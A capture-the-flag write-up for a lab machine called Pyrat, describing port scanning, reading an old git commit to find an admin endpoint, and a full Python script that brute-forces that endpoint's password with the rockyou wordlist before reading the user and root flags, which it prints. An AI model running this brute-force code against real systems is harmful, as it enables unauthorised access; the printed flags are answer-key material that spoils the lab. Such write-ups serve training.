**DESCRIPTION**

  Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.﻿

**HOW TO SOLVE?**
Used nmap with server detection to find something and found port 8000.
<img width="1294" height="815" alt="image" src="https://github.com/user-attachments/assets/034b7a79-8013-4aac-82de-1ef243bbcc1c" />

Opened another terminal and used Netcat to listen for incoming network connections.
Used
```bash
git --git-dir=/opt/dev/.git show 0a3c36d:pyrat.py.old
```
And after I saw that specific py code I discoverd an endpoint, if I type in "admin" it asks for authentification.
```python
def switch_case(client_socket, data):
    if data == 'admin':
        get_admin(client_socket)
```

Brute forced the password with this PY code:
```python
import socket
ip = "10.114.151.83"
port = 8000
wordlist = "/usr/share/wordlists/rockyou.txt"

def brute():
    print(f"[*] Incepem fuzzing-ul pe {ip}:{port}...")
    with open(wordlist, 'r', encoding='latin-1') as f:
        for count, line in enumerate(f, 1):
            password = line.strip()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2) # Asteptam max 2 secunde
                s.connect((ip, port))
                s.sendall(b"admin\n")
                resp = s.recv(1024).decode(errors='ignore')
                
                if "Password" in resp:
                    s.sendall(password.encode() + b"\n")
                    final_resp = s.recv(1024).decode(errors='ignore')
                    
                    if "Welcome" in final_resp or "root" in final_resp or "shell" in final_resp:
                        print(f"\n[!] PAROLA GASITA: {password}")
                        print(f"[*] Mesaj succes: {final_resp.strip()}")
                        s.close()
                        return
                s.close()
            except Exception:
                continue
            
            if count % 100 == 0:
                print(f"[*] Incerari: {count} | Ultima parola: {password}", end="\r")

if __name__ == "__main__":
    brute()
```
<img width="1082" height="566" alt="image" src="https://github.com/user-attachments/assets/ed6f9b7f-7f74-44d9-92d2-2251f0ab0b6b" />

After I was in it was easy to find the users flag 
```bash
cat /home/think/user.txt
```
For the root flag just used ```bash sudo su```
and ```bash 
cat root.txt ```
<img width="1302" height="816" alt="image" src="https://github.com/user-attachments/assets/a0ccaa3c-3b1f-4450-a20c-8de6c6f73dda" />


**User Flag:** `ba5ed03e9e74bb98054438480165e221`
**Root Flag** `996bdb1f619a68361417cabca5454705`

